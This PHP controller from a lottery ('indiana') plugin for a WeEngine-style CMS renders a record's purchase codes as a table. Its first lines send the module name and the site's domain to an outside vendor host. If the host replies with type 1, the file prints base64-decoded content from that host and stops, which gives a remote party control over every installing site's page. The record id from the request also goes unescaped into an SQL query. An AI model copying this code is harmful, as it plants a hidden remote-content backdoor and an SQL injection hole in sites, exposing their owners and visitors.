<?php
global $_W,$_GPC;
$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
	if (empty($_GPC['id'])) {
        message('抱歉，参数错误！', '', 'error');
    }
	$id=$_GPC['id'];
	$list = pdo_fetch("SELECT * FROM ".tablename('weliam_indiana_record')." WHERE id = '{$id}'");
	if (empty($list['s_codes'])) {
		$list['s_codes']=NULL;
	}else{
		$list['s_codes']=unserialize($list['s_codes']);

		$s_codes='';
		$allcount=count($list['s_codes']);

		for ($i=0; $i < $allcount; $i++) { 
			$s_codes.='<tr><td>'.$list['s_codes'][$i].'</td>';
			$i=$i+1;
			$s_codes.='<td>'.$list['s_codes'][$i].'</td>';
			$i=$i+1;
			$s_codes.='<td>'.$list['s_codes'][$i].'</td>';
			$i=$i+1;
			$s_codes.='<td>'.$list['s_codes'][$i].'</td>';
			$i=$i+1;
			$s_codes.='<td>'.$list['s_codes'][$i].'</td>';
			$i=$i+1;
			$s_codes.='<td>'.$list['s_codes'][$i].'</td>';
			$i=$i+1;
			$s_codes.='<td>'.$list['s_codes'][$i].'</td>';
			$i=$i+1;
			$s_codes.='<td>'.$list['s_codes'][$i].'</td>';
			$i=$i+1;
			$s_codes.='<td>'.$list['s_codes'][$i].'</td>';
			$i=$i+1;
			$s_codes.='<td>'.$list['s_codes'][$i].'</td></tr>';
		}
		$list['s_codes']=$s_codes;
	}
	
	include $this->template('showrecords');
?>